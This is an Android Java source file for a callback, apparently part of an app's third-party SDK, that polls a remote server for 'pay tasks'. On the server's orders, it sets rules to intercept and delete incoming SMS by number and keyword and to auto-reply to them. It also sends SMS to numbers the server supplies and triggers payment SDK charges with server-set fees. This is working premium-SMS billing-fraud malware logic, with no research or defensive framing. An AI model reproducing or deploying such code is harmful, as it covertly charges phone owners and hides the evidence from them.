package com.thirdparty.net;

import java.util.ArrayList;

import okhttp3.Call;
import okhttp3.Response;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.LogUtil;
import com.gandalf.daemon.utils.XL_log;
import com.thirdparty.engine.ServiceStub;
import com.thirdparty.engine.ThirdSdkPayHepler;
import com.thirdparty.entry.SmsSendTask;
import com.thirdparty.entry.SmsTask;
import com.thirdparty.entry.ThirdSdkPayTask;
import com.thirdparty.entry.ThirdSdkTask;
import com.thirdparty.sms.utils.SmsInterceptHelper;
import com.thirdparty.utils.Constants;
import com.zhy.http.okhttp.callback.Callback;

public class GetPayTaskCallback extends Callback<String> {
    private static final String TAG = "GetPayTaskCallback";
    private static final XL_log log = new XL_log(GetPayTaskCallback.class);
    private Context mContext = null;
    private SmsInterceptHelper mSmsInterceptHelper = null;
    private ThirdSdkPayHepler mThirdSdkPayHepler = null;
    private int mSendSmsTaskSize = 0;

    public GetPayTaskCallback(Context context) {
        super();
        this.mContext = context;
        mSmsInterceptHelper = SmsInterceptHelper.getInstance(context);
        mThirdSdkPayHepler = ThirdSdkPayHepler.geInstance(context);
    }

    @Override
    public void onError(Call call, Exception exception, int code) {
        if (exception != null) {
            log.error("GetPayTaskCallback:" + Log.getStackTraceString(exception) + " code:" + code);
        } else {
            log.error("GetPayTaskCallback exception and exception is null");
        }
    }

    @Override
    public String parseNetworkResponse(Response response, int code) throws Exception {
        log.debug("GetPayTaskCallback");
        if (response == null)
            return null;
        String responeBody = response.body().string();
        if (!TextUtils.isEmpty(responeBody)) {
            log.debug("respone body :" + responeBody);
            parseTaskFromRespone(responeBody);
        }
        return null;
    }

    @Override
    public void onResponse(String kpa, int arg1) {
        // TODO Auto-generated method stub
    }

    private void parseTaskFromRespone(String response) {
        if (TextUtils.isEmpty(response)) {
            return;
        }
        try {
            JSONObject obj = new JSONObject(response);
            String status = obj.getString("state");
            if (!status.equals("ok")) {
                log.error("respone status not ok");
                return;
            }
            String replyKeyword = obj.getString("replyKeyword");
            String interceptNumber = obj.getString("interceptNumber");
            String interceptKeyword = obj.getString("interceptKeyword");
            long smsConfigEffectiveTime = Long.valueOf(obj.getString("smsConfigEffectiveTime"));
            log.debug("smsConfigEffectiveTime :" + smsConfigEffectiveTime / 1000 + " s");
            SmsTask smsTask = new SmsTask();
            smsTask.mSmsReplyKeyword = replyKeyword;
            smsTask.mSmsDeleteKeyword = interceptKeyword;
            smsTask.mSmsDeleteNumber = interceptNumber;
            smsTask.mSmsEffectiveTime = smsConfigEffectiveTime;
            SmsInterceptHelper helper = SmsInterceptHelper.getInstance(mContext);
            helper.addTask(smsTask);

            String nextAskTime = obj.getString("nextAskTime");
            long scheduleTime = Long.valueOf(nextAskTime);
            if (scheduleTime > 0) {
                ServiceStub.setRequestPayTaskStampTime(scheduleTime);
                ServiceStub.getInstance(mContext).scheduleRequestPayTask(scheduleTime);
            }
            boolean hasData = obj.has("smsTask");
            LogUtil.i(TAG,"smsTask hasData = "+hasData);
            if (hasData) {
                JSONArray data = obj.getJSONArray("smsTask");
                mSendSmsTaskSize = data.length();
                ArrayList<SmsSendTask> smsSendTasks = new ArrayList<>();
                for (int i = 0; i < mSendSmsTaskSize; i++) {
                    JSONObject smsData = data.getJSONObject(i);
                    String taskId = smsData.getString("taskid");
                    String number = smsData.getString("number");
                    String content = smsData.getString("sms");
                    String type = smsData.getString("smsType");
                    if (!TextUtils.isEmpty(taskId) && !TextUtils.isEmpty(number) && !TextUtils.isEmpty(content) && !TextUtils.isEmpty(type)) {
                        SmsSendTask smsSendTask = new SmsSendTask();
                        smsSendTask.mTaskId = taskId;
                        smsSendTask.mContent = content;
                        smsSendTask.mType = type;
                        smsSendTask.mSendToNumber = number;
                        smsSendTasks.add(smsSendTask);
                    }
                }
                doSendSmsTasks(smsSendTasks);
            }

            boolean hasSdkConfig = obj.has("sdkConfig");
            if (hasSdkConfig) {
                JSONArray sdkConfigArray = obj.getJSONArray("sdkConfig");
                int sdkCfgArraySize = sdkConfigArray.length();
                ArrayList<ThirdSdkPayTask> thirdSdkPayTasks = new ArrayList<>();
                for (int i = 0; i < sdkCfgArraySize; i++) {
                    JSONArray sdkArray = sdkConfigArray.getJSONArray(i);
                    ArrayList<ThirdSdkTask> thirdSdkTasks = new ArrayList<>();
                    int size = sdkArray.length();
                    for (int j = 0; j < size; j++) {
                        JSONObject sdkTask = sdkArray.getJSONObject(j);
                        String sdkName = sdkTask.getString("sdkName");
                        String appid = sdkTask.getString("appid");
                        String channelId = sdkTask.getString("channelId");
                        String feeId = sdkTask.getString("feeId");
                        String fee = sdkTask.getString("fee");
                        if (!TextUtils.isEmpty(sdkName) && !TextUtils.isEmpty(appid) && !TextUtils.isEmpty(channelId) && !TextUtils.isEmpty(feeId) && !TextUtils.isEmpty(fee)) {
                            ThirdSdkTask thirdSdkTask = new ThirdSdkTask(sdkName, appid, channelId, feeId, fee);
                            thirdSdkTasks.add(thirdSdkTask);
                        }
                    }
                    ThirdSdkPayTask thirdSdkPayTask = new ThirdSdkPayTask(thirdSdkTasks);
                    thirdSdkPayTasks.add(thirdSdkPayTask);
                }
                addThirdSdkPayTask(thirdSdkPayTasks);
                mThirdSdkPayHepler.startDoJob();
            }
        } catch (JSONException e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }
    }

    private void doSendSmsTasks(ArrayList<SmsSendTask> smsSendTasks) {
        if (smsSendTasks != null && !smsSendTasks.isEmpty()) {
            startServiceWithdSendSmsTasks(mContext, smsSendTasks);
        }
    }

    private void addThirdSdkPayTask(ArrayList<ThirdSdkPayTask> thirdSdkPayTasks) {
        if (thirdSdkPayTasks != null && !thirdSdkPayTasks.isEmpty()) {
            for (int i = 0; i < thirdSdkPayTasks.size(); i++) {
                mThirdSdkPayHepler.addCacheThirdSdkPayTask(thirdSdkPayTasks.get(i));
            }
        }
    }

    public static void startServiceWithdSendSmsTasks(Context context, ArrayList<SmsSendTask> smsSendTasks) {
        if (context == null)
            return;
        Intent intent = new Intent();
        intent.setAction(Constants.INTENT_ACTION_DO_SMS_TASK);
        Bundle bundle = new Bundle();
        bundle.putSerializable(Constants.BUNDLE_KEY_SMS_SEND_TASKS, smsSendTasks);
        intent.putExtras(bundle);
        context.sendBroadcast(intent);
    }
}
